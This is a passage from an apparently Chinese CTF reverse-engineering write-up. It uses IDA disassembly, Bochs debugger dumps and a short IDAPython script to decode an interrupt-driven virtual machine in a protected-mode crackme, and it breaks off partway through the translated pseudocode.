fword ptr ds:11Ch</span><br><span class="line">seg001:000002B9                 retn</span><br><span class="line">seg001:000002B9 IDT_Init        endp</span><br></pre></td></tr></table></figure><p>在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:40&gt; x 0x11c</span><br><span class="line">[bochs]:</span><br><span class="line">0x000000000000011c &lt;bogus+       0&gt;:0x012807ff</span><br></pre></td></tr></table></figure><p>中断门描述符被初始化为 <code>0000 8e00 0008 00fc</code>（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:79&gt; x/20 0x128</span><br><span class="line">[bochs]:</span><br><span class="line">0x0000000000000128 &lt;bogus+       0&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000138 &lt;bogus+      16&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000148 &lt;bogus+      32&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000158 &lt;bogus+      48&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br><span class="line">0x0000000000000168 &lt;bogus+      64&gt;:0x000800fc0x00008e000x000800fc0x00008e00</span><br></pre></td></tr></table></figure><p>GDT_init 处，加载 GDTR 的地址为 122：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000283 GDT_Init        proc near               ; CODE XREF: sub_205+E↑p</span><br><span class="line">seg001:00000283                 lgdt    large fword ptr ds:122h</span><br><span class="line">seg001:0000028A                 retn</span><br><span class="line">seg001:0000028A GDT_Init        endp</span><br></pre></td></tr></table></figure><p>同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bochs:74&gt; x 0x122</span><br><span class="line">[bochs]:</span><br><span class="line">0x0000000000000122 &lt;bogus+       0&gt;:0x0928001f</span><br></pre></td></tr></table></figure><p>在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 <code>INT 21H</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000022E loc_22E:                                ; CODE XREF: sub_205+58↓j</span><br><span class="line">seg001:0000022E                 nop</span><br><span class="line">seg001:0000022F                 cmp     ebx, 10h</span><br><span class="line">seg001:00000232                 jge     short loc_25F</span><br><span class="line">seg001:00000234                 mov     eax, 80000h</span><br><span class="line">seg001:00000239                 lea     edx, ds:0D08h[ebx*4]</span><br><span class="line">seg001:00000240                 mov     edx, [edx]</span><br><span class="line">seg001:00000242                 mov     ax, dx</span><br><span class="line">seg001:00000245                 mov     dx, 8E00h</span><br><span class="line">seg001:00000249                 mov     ecx, 21h ; &apos;!&apos;</span><br><span class="line">seg001:0000024E                 add     ecx, ebx</span><br><span class="line">seg001:00000250                 lea     esi, ds:128h[ecx*8]</span><br><span class="line">seg001:00000257                 mov     [esi], eax</span><br><span class="line">seg001:00000259                 mov     [esi+4], edx</span><br><span class="line">seg001:0000025C                 inc     ebx</span><br><span class="line">seg001:0000025D                 jmp     short loc_22E</span><br><span class="line">seg001:0000025F ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0000025F</span><br><span class="line">seg001:0000025F loc_25F:                                ; CODE XREF: sub_205+2D↑j</span><br><span class="line">seg001:0000025F                                         ; sub_205+61↓j</span><br><span class="line">seg001:0000025F                 call    NextHandler</span><br><span class="line">seg001:00000264                 int     21h             ; DOS -</span><br><span class="line">seg001:00000266                 jmp     short loc_25F</span><br><span class="line">seg001:00000266 sub_205         endp</span><br></pre></td></tr></table></figure><p>获取得到所有中断向量的地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0</span><br><span class="line">IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0</span><br><span class="line">IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0</span><br><span class="line">IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0</span><br><span class="line">IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0</span><br><span class="line">IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0</span><br><span class="line">IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0</span><br><span class="line">IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0</span><br><span class="line">IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0</span><br><span class="line">IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0</span><br><span class="line">IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0</span><br><span class="line">IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0</span><br><span class="line">IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0</span><br><span class="line">IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0</span><br><span class="line">IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0</span><br><span class="line">IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000D7C                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000D83                 mov     [ecx], eax</span><br><span class="line">seg001:00000D85                 jmp     loc_EF8</span><br><span class="line">seg001:00000D8A ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000D8A                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000D91                 mov     eax, [eax]</span><br><span class="line">seg001:00000D93                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000D9A                 mov     [ecx], eax</span><br><span class="line">seg001:00000D9C                 jmp     loc_EF8</span><br><span class="line">seg001:00000DA1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DA1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DA8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DAA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DB1                 lea     eax, ds:0D48h[eax*4]</span><br><span class="line">seg001:00000DB8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DBA                 mov     [ecx], eax</span><br><span class="line">seg001:00000DBC                 jmp     loc_EF8</span><br><span class="line">seg001:00000DC1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DC1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DC8                 mov     eax, [eax]</span><br><span class="line">seg001:00000DCA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DD1                 mov     ecx, [ecx]</span><br><span class="line">seg001:00000DD3                 lea     ecx, ds:0D48h[ecx*4]</span><br><span class="line">seg001:00000DDA                 mov     [ecx], eax</span><br><span class="line">seg001:00000DDC                 jmp     loc_EF8</span><br><span class="line">seg001:00000DE1 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DE1                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000DE8                 mov     edx, [eax]</span><br><span class="line">seg001:00000DEA                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000DF1                 mov     eax, [ecx]</span><br><span class="line">seg001:00000DF3                 add     eax, edx</span><br><span class="line">seg001:00000DF5                 mov     [ecx], eax</span><br><span class="line">seg001:00000DF7                 jmp     loc_EF8</span><br><span class="line">seg001:00000DFC ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000DFC                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E03                 mov     edx, [eax]</span><br><span class="line">seg001:00000E05                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E0C                 mov     eax, [ecx]</span><br><span class="line">seg001:00000E0E                 sub     eax, edx</span><br><span class="line">seg001:00000E10                 mov     [ecx], eax</span><br><span class="line">seg001:00000E12                 jmp     loc_EF8</span><br><span class="line">seg001:00000E17 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E17                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E1E                 mov     edx, [eax]</span><br><span class="line">seg001:00000E20                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E27                 mov     eax, [ecx]</span><br><span class="line">seg001:00000E29                 xor     eax, edx</span><br><span class="line">seg001:00000E2B                 mov     [ecx], eax</span><br><span class="line">seg001:00000E2D                 jmp     loc_EF8</span><br><span class="line">seg001:00000E32 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E32                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E39                 mov     eax, [eax]</span><br><span class="line">seg001:00000E3B                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E42                 mov     cl, al</span><br><span class="line">seg001:00000E44                 mov     eax, [edx]</span><br><span class="line">seg001:00000E46                 shl     eax, cl</span><br><span class="line">seg001:00000E48                 mov     [edx], eax</span><br><span class="line">seg001:00000E4A                 jmp     loc_EF8</span><br><span class="line">seg001:00000E4F ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E4F                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E56                 mov     eax, [eax]</span><br><span class="line">seg001:00000E58                 lea     edx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E5F                 mov     cl, al</span><br><span class="line">seg001:00000E61                 mov     eax, [edx]</span><br><span class="line">seg001:00000E63                 shr     eax, cl</span><br><span class="line">seg001:00000E65                 mov     [edx], eax</span><br><span class="line">seg001:00000E67                 jmp     loc_EF8</span><br><span class="line">seg001:00000E6C ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E6C                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E73                 mov     eax, [eax]</span><br><span class="line">seg001:00000E75                 lea     ecx, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E7C                 mov     edx, [ecx]</span><br><span class="line">seg001:00000E7E                 and     eax, edx</span><br><span class="line">seg001:00000E80                 mov     [ecx], eax</span><br><span class="line">seg001:00000E82                 jmp     short loc_EF8</span><br><span class="line">seg001:00000E84 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E84                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000E8B                 mov     eax, [eax]</span><br><span class="line">seg001:00000E8D                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000E93                 mov     [ecx], eax</span><br><span class="line">seg001:00000E95                 iret</span><br><span class="line">seg001:00000E96 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000E96                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000E9D                 mov     eax, [eax]</span><br><span class="line">seg001:00000E9F                 test    eax, eax</span><br><span class="line">seg001:00000EA1                 jnz     short loc_EF8</span><br><span class="line">seg001:00000EA3                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000EAA                 mov     eax, [eax]</span><br><span class="line">seg001:00000EAC                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000EB2                 mov     [ecx], eax</span><br><span class="line">seg001:00000EB4                 iret</span><br><span class="line">seg001:00000EB5 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000EB5                 lea     eax, ds:0B64h[eax*4]</span><br><span class="line">seg001:00000EBC                 mov     eax, [eax]</span><br><span class="line">seg001:00000EBE                 test    eax, eax</span><br><span class="line">seg001:00000EC0                 jz      short loc_EF8</span><br><span class="line">seg001:00000EC2                 lea     eax, ds:0B64h[ecx*4]</span><br><span class="line">seg001:00000EC9                 mov     eax, [eax]</span><br><span class="line">seg001:00000ECB                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000ED1                 mov     [ecx], eax</span><br><span class="line">seg001:00000ED3                 iret</span><br><span class="line">seg001:00000ED4 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000ED4                 lea     eax, unk_F94</span><br><span class="line">seg001:00000EDA                 call    sub_2EA</span><br><span class="line">seg001:00000EDF                 hlt</span><br><span class="line">seg001:00000EE0 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:00000EE0                 lea     eax, unk_FA0</span><br><span class="line">seg001:00000EE6                 call    sub_2EA</span><br><span class="line">seg001:00000EEB                 lea     eax, word_FAE</span><br><span class="line">seg001:00000EF1                 call    sub_2EA</span><br><span class="line">seg001:00000EF6                 hlt</span><br></pre></td></tr></table></figure><p>接下来在 NextHandler 处，包括 <code>INT 21H</code> 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 <code>INT 21H</code> 的操作数，故这里中断的调用是和 edi 的取值有关系的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000268 NextHandler     proc near               ; CODE XREF: sub_205:loc_25F↑p</span><br><span class="line">seg001:00000268                 mov     edi, large ds:0B78h</span><br><span class="line">seg001:0000026E                 lea     edi, ds:0D48h[edi*4]</span><br><span class="line">seg001:00000275                 mov     eax, [edi]</span><br><span class="line">seg001:00000277                 mov     large ds:65h, al</span><br><span class="line">seg001:0000027C                 mov     ecx, [edi+4]</span><br><span class="line">seg001:0000027F                 mov     eax, [edi+8]</span><br><span class="line">seg001:00000282                 retn</span><br><span class="line">seg001:00000282 NextHandler     endp</span><br></pre></td></tr></table></figure><p>回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seg001:00000EF8 loc_EF8:                                ; CODE XREF: seg001:00000D85↑j</span><br><span class="line">seg001:00000EF8                                         ; seg001:00000D9C↑j ...</span><br><span class="line">seg001:00000EF8                 lea     ecx, dword_B34+44h</span><br><span class="line">seg001:00000EFE                 mov     eax, [ecx]</span><br><span class="line">seg001:00000F00                 add     eax, 3</span><br><span class="line">seg001:00000F03                 mov     [ecx], eax</span><br><span class="line">seg001:00000F05                 iret</span><br></pre></td></tr></table></figure><p>那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）：</p><table><thead><tr><th style="text-align:center">中断编号</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td style="text-align:center">0x21</td><td style="text-align:center"><code>buf[a] = b</code></td></tr><tr><td style="text-align:center">0x22</td><td style="text-align:center"><code>buf[a] = buf[b]</code></td></tr><tr><td style="text-align:center">0x23</td><td style="text-align:center"><code>buf[a] = code[buf[b]]</code></td></tr><tr><td style="text-align:center">0x24</td><td style="text-align:center"><code>code[buf[a]] = buf[b]</code></td></tr><tr><td style="text-align:center">0x25</td><td style="text-align:center"><code>buf[a] += buf[b]</code></td></tr><tr><td style="text-align:center">0x26</td><td style="text-align:center"><code>buf[a] -= buf[b]</code></td></tr><tr><td style="text-align:center">0x27</td><td style="text-align:center"><code>buf[a] ^= buf[b]</code></td></tr><tr><td style="text-align:center">0x28</td><td style="text-align:center"><code>buf[a] &lt;&lt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x29</td><td style="text-align:center"><code>buf[a] &gt;&gt;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2A</td><td style="text-align:center"><code>buf[a] &amp;= buf[b]</code></td></tr><tr><td style="text-align:center">0x2B</td><td style="text-align:center"><code>pc = a</code></td></tr><tr><td style="text-align:center">0x2C</td><td style="text-align:center"><code>if(buf[b] == 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2D</td><td style="text-align:center"><code>if(buf[b] != 0) pc = buf[a]</code></td></tr><tr><td style="text-align:center">0x2E</td><td style="text-align:center">终止 CPU 运行，即 hlt 指令</td></tr><tr><td style="text-align:center">0x2F</td><td style="text-align:center">输出 flag 正确提示</td></tr><tr><td style="text-align:center">0x30</td><td style="text-align:center">输出 flag 错误提示</td></tr></tbody></table><p>根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0x0F48</span>, <span class="number">0x11E0</span>, <span class="number">12</span>):</span><br><span class="line">    ins = Dword(addr)</span><br><span class="line">    op1 = Dword(addr + <span class="number">4</span>)</span><br><span class="line">    op2 = Dword(addr + <span class="number">8</span>)</span><br><span class="line">    code.append(ins)</span><br><span class="line">    code.append(op1)</span><br><span class="line">    code.append(op2)</span><br><span class="line"><span class="keyword">print</span> code</span><br></pre></td></tr></table></figure><p>然后用脚本处理一下，得到伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] ^= buf[<span class="number">1</span>]</span><br><span class="line">code[buf[<span class="number">1</span>]] = buf[<span class="number">1</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># 